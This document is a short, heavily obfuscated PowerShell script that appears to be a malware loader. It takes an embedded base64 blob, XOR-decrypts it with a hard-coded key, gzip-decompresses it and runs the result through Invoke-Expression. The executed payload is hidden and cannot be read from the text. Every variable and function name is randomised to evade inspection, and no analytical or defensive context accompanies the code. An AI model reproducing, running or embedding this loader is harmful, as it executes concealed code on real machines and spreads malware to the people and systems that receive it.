$9a03mzkh7lbtnci = [System.Text.Encoding]::ascii
function atcwhe3dx01qzs9o8bv5niuly4f  {param($f9eq0sv2nwptcyg )
  $1jmse8kx0nv6gz7 = [System.Convert]::FromBase64String($f9eq0sv2nwptcyg)
  $ksj9pfwdlhia8o2= $9a03mzkh7lbtnci.GetBytes("9n3ckti2g18s")
    $o2h01w9jauv5mqd = $1jmse8kx0nv6gz7
    $idy3zorebpl5v7a = $(for ($hxdqwgc7brkvt1p = 0; $hxdqwgc7brkvt1p -lt $o2h01w9jauv5mqd.length; ) {
        for ($o7xpm3g4cfvzjye = 0; $o7xpm3g4cfvzjye -lt $ksj9pfwdlhia8o2.length; $o7xpm3g4cfvzjye++) {
            $o2h01w9jauv5mqd[$hxdqwgc7brkvt1p] -bxor $ksj9pfwdlhia8o2[$o7xpm3g4cfvzjye]
            $hxdqwgc7brkvt1p++
            if ($hxdqwgc7brkvt1p -ge $o2h01w9jauv5mqd.Length) {
                $o7xpm3g4cfvzjye = $ksj9pfwdlhia8o2.length
            }
        }
    })
	$4wezrmcblk0y93v = New-Object System.IO.MemoryStream( , $idy3zorebpl5v7a )

	    $l5i31cms9wykao0 = New-Object System.IO.MemoryStream
        $6hripv1td7qsycf = New-Object System.IO.Compression.GzipStream $4wezrmcblk0y93v, ([IO.Compression.CompressionMode]::Decompress)
	    $6hripv1td7qsycf.CopyTo( $l5i31cms9wykao0 )
        $6hripv1td7qsycf.Close()
		$4wezrmcblk0y93v.Close()
		[byte[]] $bghtx106354lo7y = $l5i31cms9wykao0.ToArray()
 $zyean5d8hjumglo=$bghtx106354lo7y
    return $zyean5d8hjumglo
}
[byte[]]$tc0zmv75kg1fo2h=atcwhe3dx01qzs9o8bv5niuly4f $7easb2ul6iowxzn
[System.Text.Encoding]::ascii.GetString((atcwhe3dx01qzs9o8bv5niuly4f "JuU7Y2t0aTJjMbUmVB2oW3uKFf6XLgxpV+z85qr9eoWu1bvuq6qOW6b/juhcBuvieGjqQ+NkcRWAzuaW/OewmEpEalrSS86qXjlxNj/MDhsQFbNLczIF+NmgJCMdZy13biI3ah7ZWj10y0niYlIIkfUOdqJxY9E0V8XBsXmWzIwg4RHp5cEhKigHJUEO6+T6ZaiO5IgX+wrrqC8nNzihRVF68QmUzRHUgTtjSzusZdtSHwqbGqwfmoPalT7QWwoWkWimlO/I/jBLy/6cFYwqdnlIp3dzP3AxttSGKHjJPBXf70inmxPsiUdLpHv9LL7815UAveraaKsvDKcHOCbgBPp0YM67TGQJdwEZdfKYrQIErJhukn/7fl0SKYtAzCunezWhNsMlRr2kMpeY9dyUmuGiwX8MuGIkymueir4a1vOYrBbgH7E0BycHSYBmrgwyJnSz7p6Zn+meg2EFDZ/bzU0jDCRcvROlAswH8RTPD89dnQekXJmN+9zekOzJ7RTawg/ISsM4bE1mZK3GwxiMbRJWICLP+0tGiBNkU8HWYPC66JH9tRf3W7kBQg3XfSvtpjSb7h8QjO8pAAafVqh0htNzis12IQ2dOU858hpizG7F/wZxwvHbGomMLQ4PDu9ebcSTrglWFEbtBPLAWnz0TfqQLid4mnLLSXfn3B+OysYQM37K3UqXxBA/VniDb0O8nVfuMH41qhrENzt2aGcE1SxDVsxV0pwgF2Or51NRvxQlKqM8Faj2lzm0K5EndaIHlckDiHZa1fxra5sdPh0vtpF3nEmvIDZ2MAqjEjiQ6blnKSGMqU6WWHO8seZ0JEPI6dRnvxqfndL8iZZCZ6uDwCPmuUJ9nSjdAgzLduXUWSRTeJj731c4Czm6iSEyqAwVxg3Cb3fUGN47O9q7SJqqaoG8IZ6Tu950bUWyOGv035fMLXIQGB1ezx9LsR3T99iAY2lvFmeBybM4Tj6L8rej7FHiXIjSDmd/g4nUnsoB3EZJH4UMhvHuuaW5FQONSu7mRBlYboTmhqW5w1cIVzHoYACgNgi62vmDO9GthMFmLnlNI6d1OIxHCmf1v7/vUwDmbvU5AzeE6SVVn7lq+xgtUGowdEhutEVaN0CdLkwYDGA7mwqXYNqTpdzk5Nh4ehkdE8cbIiZsbmJHxbWCupOso6p1tNnvVrphMGvfaER5aMTtcAeOFzqGgqG5oJh6SGrqR28jFSKKNjVnMQ=="))|iex;